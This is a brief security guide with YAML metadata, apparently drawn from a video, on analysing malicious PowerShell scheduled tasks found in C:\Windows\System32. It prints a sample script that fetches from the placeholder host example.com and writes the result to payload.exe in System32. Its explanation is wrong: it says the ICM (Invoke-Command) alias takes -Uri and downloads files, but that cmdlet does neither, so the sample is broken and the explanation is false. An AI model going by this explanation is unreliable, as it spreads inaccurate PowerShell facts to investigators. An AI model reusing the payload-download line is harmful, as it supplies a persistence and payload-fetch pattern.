---
name: analyze-scheduled-tasks
description: Guide to analyzing scheduled tasks for cybersecurity investigations.
version: 1.0
category: security
source: https://youtu.be/GguO_Oc0h5A
tags:
  - relevant
body: |
  ## Introduction

  During a recent investigation, three files were discovered that appeared to be part of a staged attack. These files were scheduled tasks or AutoRuns that would automatically run when your computer turns on or a user logs in, ensuring persistence for the threat actor.

  ## File Location and Type

  All these files were placed in the root directory of the `C:\Windows\System32` folder. They ended with a `.PS1` file extension, indicating they are PowerShell scripts.

  ## Script Analysis

  Let's take a look at what is inside one of these scripts. For example, let's cat out the contents of `ab95.ps1`.

  ```powershell
  $scriptBlock = {
      ICM -Uri "http://example.com/script" | Out-File -FilePath "C:\Windows\System32\payload.exe"
  }
  ```

  The script uses an alias `ICM` which stands for `Invoke-Command`. This alias is used to execute a command on a remote computer, but in this context, it's being used to download a payload from a remote server.

  ## Splitting the Script

  To better understand the script, we can split it into multiple lines using Sublime Text. Here’s how you might do it:

  ```powershell
  $scriptBlock = {
      ICM -Uri "http://example.com/script" |
      Out-File -FilePath "C:\Windows\System32\payload.exe"
  }
  ```

  ## Understanding the Script

  The script creates a script block that uses `Invoke-Command` to download a file from a specified URI and save it as `payload.exe` in the `C:\Windows\System32` directory.

  ## Conclusion

  By analyzing these scheduled tasks, you can gain insights into potential threats and take appropriate actions to mitigate them. Understanding how these scripts work can help you identify similar patterns in future investigations.